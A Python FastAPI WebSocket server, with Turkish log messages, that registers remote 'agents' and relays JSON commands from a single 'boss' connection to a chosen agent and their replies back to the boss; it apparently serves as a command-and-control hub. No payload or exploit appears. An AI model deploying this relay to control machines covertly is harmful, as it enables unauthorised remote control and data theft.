from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from typing import Dict
import json

app = FastAPI()

class ConnectionManager:
    def __init__(self):
        self.active_agents: Dict[str, WebSocket] = {}
        self.boss_connection: WebSocket = None

    async def broadcast_list(self):
        if self.boss_connection:
            agent_list = list(self.active_agents.keys())
            try:
                await self.boss_connection.send_text(json.dumps({"type": "agent_list", "agents": agent_list}))
            except: pass

    async def connect_agent(self, websocket: WebSocket, agent_id: str):
        await websocket.accept()
        self.active_agents[agent_id] = websocket
        print(f"[+] Yeni Ajan: {agent_id}")
        await self.broadcast_list()

    def disconnect_agent(self, agent_id: str):
        if agent_id in self.active_agents:
            del self.active_agents[agent_id]
            print(f"[-] Ajan Ayrıldı: {agent_id}")
            # Patronu haberdar etmemiz gerekebilir ama async olduğu için burada basit geçiyoruz

    async def connect_boss(self, websocket: WebSocket):
        await websocket.accept()
        self.boss_connection = websocket
        print("[+] PATRON BAĞLANDI!")
        await self.broadcast_list()

    def disconnect_boss(self):
        self.boss_connection = None
        print("[-] Patron Ayrıldı.")

    async def send_command_to_agent(self, agent_id: str, command: dict):
        if agent_id in self.active_agents:
            try:
                await self.active_agents[agent_id].send_text(json.dumps(command))
            except: pass

    async def send_data_to_boss(self, data: dict):
        if self.boss_connection:
            try:
                await self.boss_connection.send_text(json.dumps(data))
            except: pass

manager = ConnectionManager()

@app.websocket("/ws/agent/{agent_id}")
async def websocket_endpoint_agent(websocket: WebSocket, agent_id: str):
    await manager.connect_agent(websocket, agent_id)
    try:
        while True:
            data = await websocket.receive_text()
            await manager.send_data_to_boss(json.loads(data))
    except WebSocketDisconnect:
        manager.disconnect_agent(agent_id)

@app.websocket("/ws/boss")
async def websocket_endpoint_boss(websocket: WebSocket):
    await manager.connect_boss(websocket)
    try:
        while True:
            data = await websocket.receive_text()
            command_data = json.loads(data)
            target = command_data.get("target_id")
            if target:
                await manager.send_command_to_agent(target, command_data)
    except WebSocketDisconnect:
        manager.disconnect_boss()